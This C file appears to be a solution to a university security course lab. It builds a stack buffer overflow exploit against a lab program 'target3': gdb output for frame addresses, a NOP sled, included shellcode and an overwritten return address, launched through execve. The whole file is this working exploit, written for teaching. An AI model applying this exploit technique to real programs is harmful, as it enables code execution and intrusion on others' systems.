#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode-64.h"

#define TARGET "../targets/target3"

/*
(gdb) break foo
Breakpoint 1 at 0x400c3a: file target3.c, line 21.

(gdb) info frame
Stack level 0, frame at 0x3021fea0:
 rip = 0x400c3a in foo (target3.c:21); saved rip = 0x400cd2
 called by frame at 0x3021fed0
 source language c.
 Arglist at 0x3021fe90, args: arg=0x7fffffffd85d "test"
 Locals at 0x3021fe90, Previous frame's sp is 0x3021fea0
 Saved registers:
  rbp at 0x3021fe90, rip at 0x3021fe98

(gdb) p &buf
$1 = (char (*)[64]) 0x3021fe50

*/

/* ECE568 BEGIN */
#define NOP '\x90'
#define SHELLCODE_LEN sizeof(shellcode) / sizeof(shellcode[0])
#define AAAA_LEN 4
#define BUF_SIZE 0x3021fe98 - 0x3021fe50 - AAAA_LEN  //* Note that `buf` will already be filled with "AAAA" and then concatenated with `attack_s`. Thus, we have to decrement the size of `attack_s` by 4.
#define RA_LEN 4
#define BUF_TO_OVERFLOW_SIZE BUF_SIZE + RA_LEN
/* ECE568 END */

int main(int argc, char *argv[]) {
    char *args[3];
    char *env[1];

    /* ECE568 BEGIN */
    char attack_s[BUF_TO_OVERFLOW_SIZE];
    memset(attack_s, 0, BUF_TO_OVERFLOW_SIZE);

    for (int i = 0; i < BUF_SIZE - SHELLCODE_LEN + 1; i++) {
        attack_s[i] = NOP;
    }

    strcat(attack_s, shellcode);
    strcat(attack_s, "\x50\xfe\x21\x30");
    /* ECE568 END */

    args[0] = TARGET;
    args[1] = attack_s;
    args[2] = NULL;

    env[0] = NULL;

    if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");

    return (0);
}
